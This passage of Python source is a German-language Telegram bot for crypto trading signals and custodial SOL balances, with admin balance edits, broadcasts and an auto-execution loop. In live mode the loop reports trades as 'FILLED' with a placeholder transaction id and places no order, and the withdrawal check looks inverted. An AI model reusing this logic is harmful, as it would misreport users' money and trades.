        msg = "📣 Neuer Call:\\n" + fmt_call(row)
        subs = all_subscribers()
        sent = 0
        for su in subs:
            try:
                bot.send_message(su, msg, parse_mode="Markdown")
                queue_execution(row["id"], su, status="QUEUED", message="Queued by broadcast")
                sent += 1
            except Exception:
                pass
        bot.answer_callback_query(c.id, f"An {sent} Abonnenten gesendet.")
        return

    # admin list investors
    if data == "admin_list_investors":
        if not is_admin(uid):
            return
        rows = list_investors(limit=100, offset=0)
        if not rows:
            bot.answer_callback_query(c.id, "Keine Abonnenten.")
            return
        parts = ["👥 Investoren (Top)"]
        for r in rows:
            name = "@" + r["username"] if r["username"] else "(kein Username)"
            parts.append(f"- {name} • {fmt_sol_usdc(r['sol_balance_lamports'])} • News: {r['sub_types'] or '-'}")
        bot.answer_callback_query(c.id)
        bot.send_message(uid, "\n".join(parts), parse_mode="Markdown")
        return

    # admin view users pagination
    if data.startswith("admin_view_users_"):
        if not is_admin(uid):
            return
        try:
            offset = int(data.split("_")[-1])
        except Exception:
            offset = 0
        with get_db() as con:
            total = con.execute("SELECT COUNT(*) as cnt FROM users").fetchone()["cnt"]
            rows = con.execute("SELECT user_id, username, sol_balance_lamports, source_wallet, auto_mode, auto_risk, sub_types FROM users ORDER BY sol_balance_lamports DESC LIMIT 10 OFFSET ?", (offset,)).fetchall()
        if not rows:
            bot.answer_callback_query(c.id, "Keine Nutzer.")
            return
        bot.answer_callback_query(c.id)
        for r in rows:
            uname = "@" + (r["username"] or "") if r["username"] else "(kein Username)"
            txt = (f"{uname} • UID {r['user_id']}\n"
                   f"Guthaben: {fmt_sol_usdc(r['sol_balance_lamports'])}\n"
                   f"Source: `{r['source_wallet'] or '-'}'\n"
                   f"Auto: {r['auto_mode']} / {r['auto_risk']}\n"
                   f"News: {r['sub_types'] or '-'}")
            bot.send_message(uid, txt, parse_mode="Markdown", reply_markup=kb_user_row(r["user_id"]))
        bot.send_message(uid, "Navigation:", parse_mode=None, reply_markup=kb_users_pagination(offset, total))
        return

    # admin inline actions and other callbacks handled above...
    bot.answer_callback_query(c.id, "")


@bot.message_handler(func=lambda m: True)
def catch_all(m: Message):
    uid = m.from_user.id
    text = (m.text or "").strip() if m.text else ""

    # admin: set wallet
    if ADMIN_AWAIT_SET_WALLET.get(uid):
        target = ADMIN_AWAIT_SET_WALLET.pop(uid)
        if not is_admin(uid):
            bot.reply_to(m, "Nicht erlaubt.")
            return
        wallet = text
        if not is_probably_solana_address(wallet):
            bot.reply_to(m, "Ungültige Solana-Adresse.")
            return
        set_source_wallet(target, wallet)
        bot.reply_to(m, f"Source-Wallet für {target} gesetzt: `{wallet}`", parse_mode="Markdown")
        try:
            bot.send_message(target, f"Admin hat deine Source-Wallet gesetzt: `{wallet}`", parse_mode="Markdown")
        except Exception:
            pass
        return

    # initial source wallet setting
    if WAITING_SOURCE_WALLET.get(uid, False):
        WAITING_SOURCE_WALLET[uid] = False
        wallet = text
        if not is_probably_solana_address(wallet):
            bot.reply_to(m, "Bitte eine gültige Solana-Adresse eingeben.", parse_mode="Markdown")
            return
        set_source_wallet(uid, wallet)
        price = get_sol_usd()
        px = f"(1 SOL ≈ {price:.2f} USDC)" if price > 0 else ""
        bot.reply_to(m, f"✅ Absender-Wallet gespeichert.\nSende SOL von `{wallet}` an `{CENTRAL_SOL_PUBKEY}`\n{px}", parse_mode="Markdown")
        return

    # admin: simple call input
    if ADMIN_AWAIT_SIMPLE_CALL.get(uid, False):
        ADMIN_AWAIT_SIMPLE_CALL[uid] = False
        if not is_admin(uid):
            bot.reply_to(m, "Nicht erlaubt.")
            return
        parts = [p.strip() for p in text.split("|")]
        if len(parts) < 2:
            bot.reply_to(m, "Formatfehler.")
            return
        t0 = parts[0].upper()
        if t0 == "FUTURES" and len(parts) >= 4:
            _, base, side, lev = parts[:4]
            cid = create_call(uid, "FUTURES", base.upper(), side.upper(), lev, None, "")
            c = get_call(cid)
            bot.reply_to(m, "✅ Call gespeichert:\n" + fmt_call(c), parse_mode="Markdown")
        elif t0 == "MEME" and len(parts) >= 3:
            _, name_or_symbol, token_addr = parts[:3]
            cid = create_call(uid, "MEME", name_or_symbol.upper(), None, None, token_addr, "")
            c = get_call(cid)
            bot.reply_to(m, "✅ Call gespeichert:\n" + fmt_call(c), parse_mode="Markdown")
        else:
            bot.reply_to(m, "Formatfehler.")
        return

    # admin: balance edit input (after inline)
    if ADMIN_AWAIT_BALANCE_EDIT.get(uid) is not None:
        target = ADMIN_AWAIT_BALANCE_EDIT.pop(uid)
        if not is_admin(uid):
            bot.reply_to(m, "Nicht erlaubt.")
            return
        try:
            sol = float(text.replace(",", "."))
            lam = int(sol * LAMPORTS_PER_SOL)
            set_balance(target, lam)
            nb = fmt_sol_usdc(get_balance_lamports(target))
            bot.reply_to(m, f"✅ Guthaben gesetzt: {target} {fmt_sol_usdc(lam)} • Neues Guthaben: {nb}")
            try:
                bot.send_message(target, f"Admin hat dein Guthaben gesetzt: {fmt_sol_usdc(lam)} • Neues Guthaben: {nb}", parse_mode="Markdown")
            except Exception:
                pass
        except Exception:
            bot.reply_to(m, "Fehler beim Parsen. Sende z.B. 0.25")
        return

    # admin broadcast (all)
    if ADMIN_AWAIT_TRADE_STATUS.get(uid, False):
        ADMIN_AWAIT_TRADE_STATUS[uid] = False
        if not is_admin(uid):
            bot.reply_to(m, "Nicht erlaubt.")
            return
        msg = text
        if not msg:
            bot.reply_to(m, "Bitte Text senden.")
            return
        subs = all_subscribers()
        sent = 0
        for su in subs:
            try:
                bot.send_message(su, f"📢 Broadcast: {md_escape(msg)}", parse_mode="Markdown")
                sent += 1
            except Exception:
                pass
        bot.reply_to(m, f"✅ Nachricht gesendet an {sent} Abonnenten.")
        return

    # admin: import balances (paste multiline list)
    if ADMIN_AWAIT_IMPORT_BALANCES.get(uid):
        ADMIN_AWAIT_IMPORT_BALANCES.pop(uid)
        if not is_admin(uid):
            bot.reply_to(m, "Nicht erlaubt.")
            return
        lines = text.splitlines()
        updated = 0
        for ln in lines:
            try:
                if "UID" not in ln:
                    continue
                import re
                m_uid = re.search(r"UID\s*([0-9]+)", ln)
                if not m_uid:
                    continue
                uid_num = int(m_uid.group(1))
                m_amt = re.search(r"([0-9]+\.[0-9]+)\s*SOL", ln)
                if not m_amt:
                    m_amt = re.search(r"([0-9]+\.[0-9]{1,6})\s*SOL", ln)
                if not m_amt:
                    continue
                sol_amt = float(m_amt.group(1))
                lam = int(sol_amt * LAMPORTS_PER_SOL)
                upsert_user(uid_num, "", 1 if str(uid_num) in ADMIN_IDS else 0)
                set_balance(uid_num, lam)
                updated += 1
            except Exception:
                continue
        bot.reply_to(m, f"Import abgeschlossen, aktualisierte Nutzer: {updated}")
        return

    # withdraw amount entry
    if WAITING_WITHDRAW_AMOUNT.get(uid) is None:
        try:
            sol = float(text.replace(",", "."))
            if sol <= 0:
                bot.reply_to(m, "Betrag muss > 0 sein.")
                return
            lam = int(sol * LAMPORTS_PER_SOL)
            if get_balance_lamports(uid) < lam:
                bot.reply_to(m, f"Unzureichendes Guthaben. Verfügbar: {fmt_sol_usdc(get_balance_lamports(uid))}")
                WAITING_WITHDRAW_AMOUNT.pop(uid, None)
                return
            WAITING_WITHDRAW_AMOUNT[uid] = lam
            bot.reply_to(m, f"Auszahlung: {fmt_sol_usdc(lam)} — Wähle Lockup & Fee:", reply_markup=kb_withdraw_options())
        except Exception:
            bot.reply_to(m, "Bitte eine gültige Zahl eingeben, z. B. 0.25.")
        return

    # default
    bot.reply_to(m, "Ich habe das nicht verstanden. Benutze das Menü unten.", reply_markup=kb_main(get_user(uid)))


# ---------------------------
# Background: executor & payout reminder
# ---------------------------
def auto_executor_loop():
    while True:
        try:
            with get_db() as con:
                rows = con.execute("""
                    SELECT e.id as eid, e.user_id, e.call_id, e.status, u.auto_mode, u.auto_risk, u.sol_balance_lamports, e.stake_lamports
                    FROM executions e
                    JOIN users u ON u.user_id = e.user_id
                    WHERE e.status='QUEUED'
                    LIMIT 200
                """).fetchall()
            for r in rows:
                if r["auto_mode"] != "ON":
                    with get_db() as con:
                        con.execute("UPDATE executions SET status='ERROR', message='Auto OFF' WHERE id=?", (r["eid"],))
                    continue
                call = get_call(r["call_id"])
                stake_info = r["stake_lamports"] or _compute_stake_for_user(r["user_id"])
                if SIMULATION_MODE:
                    if call["market_type"] == "FUTURES":
                        result = futures_place_simulated(r["user_id"], call["base"], call["side"], call["leverage"], r["auto_risk"])
                    else:
                        result = dex_market_buy_simulated(r["user_id"], call["base"], stake_info)
                else:
                    result = {"status": "FILLED", "txid": "LIVE-TX-REPLACE"}
                status = result.get("status") or "FILLED"
                txid = result.get("txid") or result.get("order_id") or ""
                with get_db() as con:
                    con.execute("UPDATE executions SET status=?, txid=?, message=? WHERE id=?", (status, txid, "JOINED", r["eid"]))
                try:
                    simtxt = " (SIM)" if SIMULATION_MODE else ""
                    bot.send_message(r["user_id"], f"🤖 Auto-Entry{simtxt} • {r['auto_risk']}\\n{fmt_call(call)}\\nStatus: *{status}*\\nEinsatz (Info): {fmt_sol_usdc(stake_info)}\\nGuthaben: {fmt_sol_usdc(get_balance_lamports(r['user_id']))}\\n`{txid}`", parse_mode="Markdown")
                except Exception:
                    pass
        except Exception as e:
            print("executor loop error:", e)
        time.sleep(5)


def payout_reminder_loop():
    while True:
        try:
            with get_db() as con:
                rows = con.execute("""
                    SELECT id, amount_lamports FROM payouts
                    WHERE status='REQUESTED' AND (last_notified_at IS NULL OR (strftime('%s','now') - strftime('%s',COALESCE(last_notified_at,'1970-01-01')) > 1200))
                    ORDER BY created_at ASC
                """).fetchall()
            for r in rows:
                for aid in ADMIN_IDS:
                    try:
                        bot.send_message(int(aid), f"⏰ Erinnerung: Auszahlung #{r['id']} offen • Betrag {fmt_sol_usdc(r['amount_lamports'])}", reply_markup=kb_payout_manage(r["id"]))
                    except Exception:
                        pass
                with get_db() as con:
                    con.execute("UPDATE payouts SET last_notified_at=CURRENT_TIMESTAMP WHERE id=?", (r["id"],))
            time.sleep(60)
        except Exception as e:
            print("payout reminder loop error:", e)
            time.sleep(60)


threading.Thread(target=auto_executor_loop, daemon=True).start()
threading.Thread(target=payout_reminder_loop, daemon=True).start()

print("Bot läuft — enhanced final. SIMULATION_MODE =", SIMULATION_MODE)
bot.infinity_polling(timeout=60, long_polling_timeout=60)